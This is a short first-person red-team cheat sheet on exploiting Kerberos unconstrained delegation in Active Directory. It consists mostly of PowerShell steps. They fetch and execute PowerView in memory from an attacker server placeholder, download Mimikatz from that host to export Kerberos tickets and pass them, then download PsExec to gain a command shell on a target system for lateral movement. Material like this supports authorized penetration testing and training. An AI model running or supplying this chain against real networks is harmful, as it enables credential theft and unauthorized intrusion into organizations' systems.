# <h1 align="center" id="heading">Unconstrained Delegation</h1>
Unconstrained Delegation is possible when the userAccountControl property TRUSTED_FOR_DELEGATION is present. I can use the following PowerView command to enumerate systems with this property set:
```powershell
IEX(New-Object System.Net.WebClient).DownloadString("http://<attacker_server>/PowerView.ps1");Get-DomainComputer -Unconstrained
```
I will then need to download and execute Mimikatz to export the TGT to a file in order to make better use of it. I can use the following commands to accomplish this task:
```powershell
wget http://<attacker server>/mimikatz64.exe -outfile C:\Windows\Tasks\mimikatz64.exe
```
```powershell
C:\Windows\Tasks\mimikatz64.exe
```
```powershell
sekurlsa::tickets /export
```
Once the ticket has been saved to disk, I can use the following command to PTT to the target system:
```powershell
kerberos::ptt <output file>.kirbi
```
```powershell
exit
```
I will now need to upload and execute PsExec with the following commands in order to achieve code execution on the target system:
```powershell
wget http://<attacker server>/PsExec64.exe -outfile C:\Windows\Tasks\PsExec64.exe
```
```powershell
C:\Windows\Tasks\PsExec64.exe \\<target system> cmd
```
If the attack is successful, I will recieve a session on the target and can verify that it is stable with the following command:
```console
whoami
```
There are very specific conditions within the environment that must be met in order for this attack to be successful. If those conditions are met, this can be a quick and easy win for lateral movement.
